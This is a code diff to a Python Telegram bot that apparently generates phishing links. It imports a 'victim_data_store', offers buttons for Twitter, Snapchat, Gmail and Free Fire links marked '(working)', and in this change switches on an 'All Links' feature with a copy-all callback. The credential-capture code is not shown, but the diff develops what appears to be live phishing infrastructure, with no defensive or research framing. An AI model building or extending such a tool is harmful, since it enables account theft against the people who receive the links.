@@ -10,7 +10,8 @@ from bot.buttons import (
     handle_twit_button, handle_twit_callback,
     handle_snap_button, handle_snap_callback,
     handle_gmail_button, handle_gmail_callback,
-    handle_freefire_button, handle_freefire_callback
+    handle_freefire_button, handle_freefire_callback,
+    handle_all_links, handle_copy_all
 )
 from bot.server import app
 from bot.utils.storage import link_cache, victim_data_store
@@ -80,7 +81,7 @@ def show_main_menu(message):
         "👻 Snapchat (working)\n"
         "📧 Gmail (working)\n"
         "🎮 Free Fire (working)\n"
-        "🔗 All Links (coming soon)",
+        "🔗 All Links (working)",
         reply_markup=get_bottom_buttons(),
         parse_mode="Markdown"
     )
@@ -111,7 +112,7 @@ def route_buttons(message):
     elif text == "🎮 Free Fire":
         handle_freefire_button(bot, message, get_bottom_buttons)
     elif text == "🔗 All Links":
-        bot.send_message(user_id, "⏳ *All Links* coming soon.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+        handle_all_links(bot, message, get_bottom_buttons)
     else:
         bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())
 
@@ -151,6 +152,11 @@ def handle_inline(call):
         handle_freefire_callback(bot, call)
         return
 
+    # All Links callbacks
+    if data == "copy_all":
+        handle_copy_all(bot, call)
+        return
+
     # Generic copy
     if data == "copy":
         bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
@@ -167,6 +173,6 @@ def run_bot():
             time.sleep(5)
 
 if __name__ == "__main__":
-    print("🤖 Bot Running... All 7 buttons working!")
+    print("🤖 Bot Running... All 8 buttons working!")
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=5000, debug=False)
